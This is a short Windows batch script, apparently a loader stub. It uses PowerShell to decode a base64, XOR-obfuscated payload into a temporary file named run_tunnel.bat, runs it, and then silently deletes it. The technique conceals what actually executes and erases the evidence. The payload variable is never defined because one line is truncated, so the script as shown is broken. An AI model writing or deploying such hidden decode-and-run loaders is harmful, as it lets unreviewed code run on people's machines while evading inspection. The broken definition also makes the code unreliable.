@echo off
chcp 65001 >nul

set "SIFRELI_"
set "KEY=42"

powershell -NoProfile -Command "$b=[Convert]::FromBase64String('%SIFRELI_KOD%'); for($i=0;$i -lt $b.Length;$i++){$b[$i]=$b[$i] -bxor %KEY%}; [System.Text.Encoding]::UTF8.GetString($b)" > "%temp%\run_tunnel.bat"

call "%temp%\run_tunnel.bat"

del "%temp%\run_tunnel.bat" >nul 2>&1